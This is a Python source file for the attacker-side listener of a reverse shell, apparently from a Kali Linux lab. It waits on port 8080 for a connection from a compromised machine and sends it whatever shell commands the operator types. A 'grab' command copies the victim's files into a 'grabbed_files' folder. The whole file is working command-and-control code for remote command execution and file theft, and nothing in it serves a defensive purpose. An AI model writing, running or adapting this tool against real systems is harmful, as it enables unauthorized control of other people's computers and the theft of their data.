import os.path
import socket

def transfer(conn, command):
    _,filename = command.split('*')
    filename = os.path.basename(filename)
    savepath = os.path.join('/home/kali/Desktop/grabbed_files',filename) #provide the path to the directory
    conn.send(command.encode())
    with open(savepath, 'wb') as f:
        while True:
            bits = conn.recv(1024)
            if b'Unable to find out the file' in bits:
                print('[-] Unable to find out the file')
                break
            if bits.endswith(b'DONE'):
                f.write(bits[:-4])  # Write all bits except the 'DONE' part
                print('[+] Transfer completed')
                break
            f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('192.168.126.139', 8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+] We got a connection from:', addr)
    if not os.path.exists('/home/kali/Desktop/grabbed_files'):
        os.mkdir('/home/kali/Desktop/grabbed_files') #provide the path to the directory
    running = True

    while running:
        command = input('Shell> ')
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            running = False
        elif 'grab' in command:
            transfer(conn, command)
            if input("Do you want to grab another file (y/n): ").lower() != 'y':
                running = False
        else:
            conn.send(command.encode())
            response = conn.recv(1024).decode()
            print(response)


def main():
    connect()

if __name__ == '__main__':
    main()
